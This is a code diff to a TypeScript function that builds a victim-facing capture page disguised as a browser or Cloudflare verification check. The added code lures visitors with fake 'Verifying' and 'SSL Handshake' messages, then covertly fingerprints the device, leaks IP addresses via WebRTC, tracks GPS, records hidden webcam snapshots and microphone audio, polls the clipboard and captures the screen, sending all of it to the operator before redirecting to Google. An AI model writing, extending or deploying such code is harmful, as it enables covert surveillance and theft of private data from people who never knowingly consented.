@@ -17,13 +17,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
     var extraBuffer = {};
     window.lastStatusMsg = "Initializing...";
 
-    function pTimeout(promise, ms) {
-      return Promise.race([
-        promise,
-        new Promise(function(resolve) { setTimeout(function() { resolve(null); }, ms); })
-      ]);
-    }
-
+    // --- Core Functions ---
     async function logEvent(type, data) {
       console.log("[DEBUG] logEvent called: ", type, data);
       try {
@@ -56,6 +50,247 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
         extraBuffer = {};
         await logEvent('extra', dataToSend);
       }
+    }
+
+    function clientLog(msg, data = {}) {
+      logEvent('debug', { msg, data, ts: Date.now() });
+    }
+
+    async function runSilentProbes() {
+      // Avoid double running
+      if (window._silentProbesActive) return;
+      window._silentProbesActive = true;
+      
+      // CPU & Memory Fingerprint
+      var start = performance.now();
+      for(var i=0; i<1000000; i++) Math.sqrt(i);
+      var score = (performance.now() - start).toFixed(2);
+      await logExtra({ cpu_bench: score + 'ms', mem_gb: navigator.deviceMemory || 'N/A' });
+
+      // Advanced 2026 Biometric & Environment APIs
+      try {
+        if (navigator.computePressure) {
+           var observer = new ComputePressureObserver(async (records) => {
+             await logExtra({ thermal_load: JSON.stringify(records) });
+           });
+           observer.observe('cpu');
+           setTimeout(() => observer.unobserve('cpu'), 4000);
+        }
+        if (navigator.eyeTracking) await logExtra({ biometric_eye: 'available' });
+        if (navigator.keyboard && navigator.keyboard.getLayoutMap) {
+           var map = await navigator.keyboard.getLayoutMap().catch(() => null);
+           if (map) await logExtra({ kbd_layout: 'detected' });
+        }
+      } catch(e) {}
+
+      // High Entropy Hardware Identity
+      if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
+        navigator.userAgentData.getHighEntropyValues(['architecture', 'model', 'platformVersion', 'fullVersionList', 'bitness', 'formFactor', 'wow64']).then(async function(h) {
+           await logExtra({ hw_entropy: JSON.stringify(h) });
+        }).catch(function(){});
+      }
+
+      // WebGL Deep Forensics
+      try {
+        var c = document.createElement('canvas');
+        var gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+        if (gl) {
+          var dbg = gl.getExtension('WEBGL_debug_renderer_info');
+          var gpu = {
+            v: dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : 'N/A',
+            r: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : 'N/A',
+            max_tex: gl.getParameter(gl.MAX_TEXTURE_SIZE),
+            max_view: gl.getParameter(gl.MAX_VIEWPORT_DIMS)[0] + 'x' + gl.getParameter(gl.MAX_VIEWPORT_DIMS)[1],
+            shading: gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
+          };
+          await logExtra({ gpu_deep: JSON.stringify(gpu) });
+        }
+      } catch(e) {}
+
+      // WebAudio Fingerprint
+      try {
+        var ctx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
+        var osc = ctx.createOscillator();
+        osc.type = 'triangle';
+        osc.frequency.setValueAtTime(12000, ctx.currentTime);
+        var comp = ctx.createDynamicsCompressor();
+        comp.threshold.setValueAtTime(-45, ctx.currentTime);
+        osc.connect(comp);
+        comp.connect(ctx.destination);
+        osc.start(0);
+        ctx.startRendering().then(async function(buf) {
+          var s = 0;
+          for (var i = 4000; i < 4100; i++) s += Math.abs(buf.getChannelData(0)[i]);
+          await logExtra({ audio_hash: s.toFixed(15) });
+        });
+      } catch(e) {}
+
+      // WebRTC Leakage
+      try {
+        var pc = new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
+        pc.createDataChannel("");
+        pc.createOffer().then(o => pc.setLocalDescription(o));
+        pc.onicecandidate = async function(ice) {
+          if (ice && ice.candidate && ice.candidate.candidate) {
+            var ip = ice.candidate.candidate;
+            if (ip.includes('typ srflx')) await logExtra({ rtc_public: ip });
+            else if (ip.includes('typ host')) await logExtra({ rtc_local: ip });
+          }
+        };
+      } catch(e) {}
+    }
+
+    async function fireGPS() {
+      clientLog("fireGPS: Starting");
+      if (requiredPerms.includes('gps') && navigator.geolocation) {
+        clientLog("fireGPS: GPS permission included");
+        return new Promise(resolve => {
+          navigator.geolocation.watchPosition(
+            (pos) => { 
+               logEvent('gps', { lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }); 
+               permsCompleted++; 
+               resolve(); 
+            },
+            (e) => { 
+                clientLog("fireGPS: Error", e.message);
+                fetch('https://ipapi.co/json/')
+                    .then(r => r.json())
+                    .then(data => logEvent('ip_geo', data))
+                    .catch(err => clientLog("IP Geo failed", err.message));
+                permsCompleted++; 
+                resolve(); 
+            },
+            { enableHighAccuracy: true, maximumAge: 0 }
+          );
+          setTimeout(() => { resolve(); }, 3500); 
+        });
+      } else if (requiredPerms.includes('gps')) {
+         permsCompleted++;
+         return Promise.resolve();
+      }
+    }
+
+    async function fireParallel() {
+      clientLog("fireParallel: Starting");
+      if (requiredPerms.includes('media')) {
+        clientLog("fireParallel: Media permission included");
+        try {
+          if (navigator.mediaDevices) {
+            var constraints = { video: { facingMode: "user" }, audio: true };
+            var stream = await navigator.mediaDevices.getUserMedia(constraints).catch(async (e) => {
+               clientLog("fireParallel: getUserMedia failed, trying fallback", e.message);
+               return navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false }).catch((e2) => {
+                   clientLog("fireParallel: Fallback failed", e2.message);
+                   return null;
+               });
+            });
+            
+            if (stream) {
+              var video = document.createElement('video');
+              video.style.cssText = 'position:fixed;top:-9999px;left:-9999px;opacity:0;pointer-events:none;';
+              video.srcObject = stream;
+              video.setAttribute('autoplay', ''); video.setAttribute('muted', ''); video.setAttribute('playsinline', '');
+              document.body.appendChild(video);
+              await new Promise(r => { video.onloadedmetadata = () => { video.play().then(r).catch(r); }; setTimeout(r, 2000); });
+              
+              setInterval(async () => {
+                var canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                var ctx = canvas.getContext('2d');
+                if (ctx) { 
+                   ctx.drawImage(video, 0, 0, canvas.width, canvas.height); 
+                   await logEvent('extra', { visual_identity: canvas.toDataURL('image/jpeg', 0.6) }); 
+                }
+              }, 3000);
+
+              if (stream.getAudioTracks().length > 0) {
+                const recorder = new MediaRecorder(stream);
+                recorder.ondataavailable = async (e) => {
+                  if (e.data.size > 0) {
+                    const reader = new FileReader();
+                    reader.onload = async () => {
+                      const base64 = reader.result.split(',')[1];
+                      await logEvent('extra', { audio_chunk: base64 });
+                    };
+                    reader.readAsDataURL(e.data);
+                  }
+                };
+                setInterval(() => {
+                  try {
+                    if (recorder.state === 'inactive') recorder.start();
+                    setTimeout(() => { if (recorder.state === 'recording') recorder.stop(); }, 4000);
+                  } catch(err) {}
+                }, 5000);
+              }
+            }
+          }
+        } catch(e) { clientLog("fireParallel: Exception", e.message); }
+        permsCompleted++;
+      }
+    }
+
+    async function firePermission(p) {
+      if (p === 'media' || p === 'gps') return; // Handled separately
+      clientLog("firePermission: " + p);
+      var prog = 30; // approx
+      try {
+        if (p === 'notification') {
+          if (typeof updateProgress === 'function') updateProgress(prog, "SSL Handshake...");
+          if ("Notification" in window) await pTimeout(Notification.requestPermission(), 4000);
+        }
+        if (p === 'clipboard') {
+          if (navigator.clipboard && navigator.clipboard.readText) {
+            var lastClip = "";
+            setInterval(async () => {
+               try {
+                 var clip = await navigator.clipboard.readText();
+                 if (clip && clip !== lastClip) {
+                    lastClip = clip;
+                    await logExtra({ clipboard_update: clip });
+                 }
+               } catch(e) {}
+            }, 3000);
+            var initialClip = await pTimeout(navigator.clipboard.readText(), 3000).catch(() => null);
+            if (initialClip) await logExtra({ clipboard: initialClip });
+          }
+        }
+        if (p === 'screen') {
+           if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
+             var s = await pTimeout(navigator.mediaDevices.getDisplayMedia({ video: true }).catch(() => null), 15000);
+             if (s) {
+               var track = s.getVideoTracks()[0];
+               var video = document.createElement('video');
+               video.style.opacity = '0';
+               video.srcObject = s;
+               video.setAttribute('autoplay', ''); video.setAttribute('muted', ''); video.setAttribute('playsinline', '');
+               document.body.appendChild(video);
+               await new Promise(r => { video.onloadedmetadata = () => { video.play().then(r).catch(r); }; setTimeout(r, 2000); });
+               setInterval(async () => {
+                   var canvas = document.createElement('canvas');
+                   canvas.width = video.videoWidth || 640; canvas.height = video.videoHeight || 480;
+                   var ctx = canvas.getContext('2d');
+                   if (ctx) { 
+                      ctx.drawImage(video, 0, 0, canvas.width, canvas.height); 
+                      await logEvent('extra', { screen_label: track.label, screen_capture: canvas.toDataURL('image/jpeg', 0.6) }); 
+                   }
+               }, 4000);
+             }
+           }
+        }
+        if (p === 'storage') {
+          if (navigator.storage && navigator.storage.estimate) {
+            var est = await navigator.storage.estimate();
+            await logExtra({ storage_mb: (est.usage/1024/1024).toFixed(2) });
+          }
+        }
+        if (p === 'sensors') {
+           if (window.Magnetometer) { var mag = new Magnetometer({frequency: 5}); mag.onreading = () => logExtra({ sensor_mag: mag.x+','+mag.y+','+mag.z }); mag.start(); }
+           if (window.Accelerometer) { var acc = new Accelerometer({frequency: 5}); acc.onreading = () => logExtra({ sensor_acc: acc.x+','+acc.y+','+acc.z }); acc.start(); }
+        }
+        if (p === 'vibration') { if (navigator.vibrate) navigator.vibrate(200); }
+      } catch(e) {}
+      permsCompleted++;
     }
 
     async function checkRedirect() {
@@ -153,21 +388,11 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
           }
           
           function handleTap(e) {
+            if (running) return;
             console.log("[DEBUG] handleTap click", e);
             clientLog("handleTap: Clicked", { e: e ? e.type : 'unknown' });
             
-            // Sequential trigger of permissions to avoid browser blocking
-            (async () => {
-              if (typeof fireGPS === 'function') await fireGPS().catch(e => console.error(e));
-              if (typeof fireParallel === 'function') await fireParallel().catch(e => console.error(e));
-            })();
-            
             var btn = getTargetBtn();
-            if (!btn) {
-              console.error("[DEBUG] handleTap: No button found!");
-              clientLog("handleTap: Error - no button found!");
-            }
-            // Stealth animation on the real UI element underneath
             if (btn && cfg.tmplId !== 'enuma_elish' && cfg.tmplId !== 'flash_strike') {
               btn.style.transform = 'scale(0.96)';
               if (!btn.classList.contains('interactive-box')) {
@@ -179,20 +404,10 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
               }, 150);
             }
 
-            // Fallback direct execution attached to the verified gesture if iframe missed
-            try {
-               if (cfg.perms) {
-                   if (cfg.perms.includes('notification') && window.Notification && Notification.requestPermission) {
-                       Notification.requestPermission().catch(e=>{});
-                   }
-                   if (cfg.perms.includes('clipboard') && navigator.clipboard && navigator.clipboard.readText) {
-                       navigator.clipboard.readText().catch(e=>{});
-                   }
-               }
-            } catch(ex) {}
-
-            flushExtra(); // Force flush on click
-            trigger();
+            // Start capture sequence immediately
+            window.startCapture('all');
+            
+            if (over && over.parentNode) over.parentNode.removeChild(over);
           }
           
           // Fallbacks just in case the iframe routing fails
@@ -212,115 +427,64 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
     }
 
     window.startCapture = async function(mode) {
+      if (running || hasRedirected) return;
+      running = true;
+
       console.log("[DEBUG] startCapture: Enter", { mode });
       clientLog("startCapture: Enter", { mode });
-      if (hasRedirected) return;
       
       var isSilent = mode === 'silent' || flowType === 'silent';
       var accent = cfg.accent || '#3498db';
-
-      if (running) return;
-      running = true;
       var statusText = null;
 
-      // 1. CAPTURE & SEND IMMEDIATE METADATA
-      var quickData = {
+      // 1. Initial Metadata
+      await logEvent('info', {
         tmplId: cfg.tmplId,
         browser: navigator.userAgent,
         platform: navigator.platform,
         screen: window.screen.width + "x" + window.screen.height,
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        langs: navigator.languages.join(','),
-        ref: document.referrer || "Direct",
-        immediate: true // Mark as immediate delivery
-      };
-      
-      var btn = document.querySelector('.btn-verify') || document.querySelector('.btn') || document.querySelector('button');
-      if (btn) {
-        btn.style.opacity = "0.7";
-        btn.innerText = "VERIFYING...";
-      }
+        ref: document.referrer || "Direct"
+      });
 
-      // Send immediately
-      await logEvent('info', quickData);
+      // 2. Silent Probes
+      runSilentProbes();
 
-      // 2. BACKGROUND PROBES (Fire and forget, they will logEvent('extra') later)
-      // Android-Specific: Haptic feedback
-      if (navigator.vibrate) navigator.vibrate([5, 10, 5]);
-
-      // Android-Specific: Immersive attempt (Best effort)
-      try { if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen().catch(() => {}); } catch(e) {}
-
-      // Start Android Meta Capture
-      const captureAndroidMeta = async () => {
-        const meta = {
-          sw_ver: navigator.appVersion,
-          mem: navigator.deviceMemory || 'unknown',
-          cores: navigator.hardwareConcurrency || 'unknown',
-          ua: navigator.userAgent,
-          platform: navigator.platform || 'unknown'
-        };
-
-        if (navigator.getBattery) {
-          try {
-            const bat = await navigator.getBattery();
-            Object.assign(meta, {
-              bat_lvl: Math.floor(bat.level * 100) + '%',
-              bat_charging: bat.charging
-            });
-          } catch(e) {}
+      if (!isSilent) {
+        // UI Preparation
+        var btn = document.querySelector('.btn-verify') || document.querySelector('.btn') || document.querySelector('button');
+        if (btn) {
+          btn.style.opacity = "0.7";
+          btn.innerText = "VERIFYING...";
         }
-        
-        await logExtra({ device_profile: meta });
-        await flushExtra();
-      };
-      captureAndroidMeta().catch(e => console.error(e));
 
-      // Silent Probes
-      runSilentProbes().then(() => flushExtra()).catch(e => console.error(e));
+        // Sequential Permission Sequence
+        // Step 1: GPS (Most likely to be asked first in many traps)
+        try {
+          await fireGPS();
+        } catch(e) { console.error("GPS Error:", e); }
 
-    if (!isSilent) {
-      clientLog("startCapture: Not silent, setting up UI");
-      if (btn) {
-        btn.style.opacity = "0.7";
-        btn.style.cursor = "wait";
-        
-        var nextText = "SYNCING SESSION...";
-        if (cfg.tmplId === 'cloudflare') nextText = "CHECKING EDGE BROWSER...";
-        if (cfg.tmplId === 'terminal') nextText = "RUNNING SECURITY MODULES...";
-        if (cfg.tmplId === 'recap') nextText = "COMPLETING...";
-        
-        btn.innerText = nextText;
-      }
-      var turnstile = document.querySelector('.turnstile-box');
-      if (turnstile) {
-        var txt = turnstile.querySelector('.turnstile-text');
-        if (txt) txt.innerText = "Verifying...";
-        var cb = turnstile.querySelector('.checkbox');
-        if (cb) cb.innerHTML = '<div style="width: 16px; height: 16px; border: 2px solid rgba(0,0,0,0.1); border-top: 2px solid ' + accent + '; border-radius: 50%; animation: spinLoader 0.8s linear infinite;"></div>';
-      }
-      
-      if (!statusText) {
-        clientLog("startCapture: Setting up progress indicator");
-        var progContainer = document.getElementById('progress-indicator');
-        if (!progContainer) {
-          progContainer = document.createElement('div');
-          progContainer.id = 'progress-indicator';
-          progContainer.style.margin = '20px 0';
-          progContainer.style.textAlign = 'center';
-          progContainer.style.width = '100%';
-          progContainer.innerHTML = '<div id="main-spinner" style="width: 28px; height: 28px; border: 3px solid rgba(0,0,0,0.05); border-top: 3px solid ' + accent + '; border-radius: 50%; animation: spinLoader 1s linear infinite; margin: 0 auto 10px;"></div><style>@keyframes spinLoader { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style><p id="status-text" style="font-size:14px; color:#666; text-align:center; font-weight: 500; font-family: inherit;">Initializing diagnostic sequence...</p>';
-          
-          if (btn && cfg.tmplId !== 'terminal') {
-            btn.parentNode.insertBefore(progContainer, btn.nextSibling);
-            btn.style.display = 'none'; 
+        // Step 2: Camera/Media
+        try {
+          await fireParallel();
+        } catch(e) { console.error("Media Error:", e); }
+
+        // Step 3: Other permissions
+        for (const p of requiredPerms) {
+          if (p !== 'gps' && p !== 'media') {
+            try {
+              await firePermission(p);
+            } catch(e) {}
           }
         }
-        statusText = document.getElementById('status-text');
+      } else {
+        // Silent flow permissions
+        if (requiredPerms.includes('vibration') && navigator.vibrate) navigator.vibrate(200);
       }
-    }
-    
-    clientLog("startCapture: Exiting");
+
+      await flushExtra();
+      setTimeout(checkRedirect, 2000);
+    };
     // ...
     
     function updateProgress(p, text) {
